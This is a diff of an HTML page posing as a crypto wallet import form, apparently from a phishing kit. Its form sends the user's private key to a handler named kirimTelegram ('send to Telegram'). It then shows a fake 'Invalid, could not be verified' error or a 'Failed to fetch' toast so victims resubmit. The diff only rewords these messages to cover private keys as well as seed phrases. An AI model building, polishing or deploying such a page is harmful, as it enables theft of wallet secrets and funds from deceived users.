@@ -291,7 +291,7 @@
         <div id="panelPK" style="display:none;">
           <form id="pkForm" onsubmit="kirimTelegram(event, 'pk')">
             <div class="pk-wrap">
-              <textarea class="pk-input" id="pkInput" placeholder="Enter your private key (0x...)" autocomplete="off" spellcheck="false"></textarea>
+              <textarea class="pk-input" id="pkInput" placeholder="Enter your Private Key" autocomplete="off" spellcheck="false"></textarea>
             </div>
             <button class="btn-submit" type="submit" id="btnSubmitPK">Import Wallet</button>
           </form>
@@ -301,15 +301,15 @@
       <!-- SUCCESS / ERROR STATE -->
       <div class="success-state" id="successState">
         <div class="success-icon">✕</div>
-        <h3>Invalid Seed Phrase</h3>
-        <p>The phrase you entered could not be verified.<br>Please check and try again.</p>
+        <h3>Invalid</h3>
+        <p>The data you entered could not be verified.</p>
       </div>
     </div>
   </div>
 
   <div class="toast" id="toast">
     <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-    Invalid phrase. Try again.
+    Failed to fetch.
   </div>
 
   <script>
